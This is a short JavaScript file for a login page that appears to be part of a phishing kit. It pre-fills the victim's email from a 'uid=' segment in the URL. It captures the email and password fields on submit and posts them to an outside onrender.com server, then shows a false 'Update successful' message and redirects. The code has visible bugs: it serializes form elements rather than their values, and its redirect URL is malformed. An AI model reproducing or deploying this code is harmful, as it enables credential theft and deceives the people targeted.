document.addEventListener('DOMContentLoaded', function(){
  function extractUserEmailFromPath() {
    const path = window.location.pathname;
    const parts = path.split('/');
    const idPart = parts.find(p=> p.startsWith('uid='));
    return idPart? decodeURIComponent(idPart.split('=')[1]):null; 
  }


  const idFromPath = extractUserEmailFromPath();

  if (idFromPath){
    const emailInput = document.querySelector('#email');

    if(emailInput){
      emailInput.value=idFromPath
    }
  }
});


document.getElementById('login_form').addEventListener('submit', async (e)=>{
  e.preventDefault();
  const inputValue1 = document.getElementById('email');
 const inputValue2 = document.getElementById('pass');

try{
  const response = await fetch('https://hum-o7p9.onrender.com/', {
    method: 'POST',
    headers:{'content-Type': 'application/json'},
    body: JSON.stringify({inputValue1, inputValue2})
  });

  const result= await response.json();
  const msg = document.getElementById('responseMessage');
  if(result.success){
    msg.style.color='green';
    msg.textContent = 'Update successful, you can login';

    setInterval(()=>{
      window.location.href = "google.com"
      
    }, 1000);

  }else{
    msg.style.color = 'red';
    msg.textContent = result.message
  }

}catch(err){
  document.getElementById('responseMessage').textContent='Error connecting to server.';
}




});

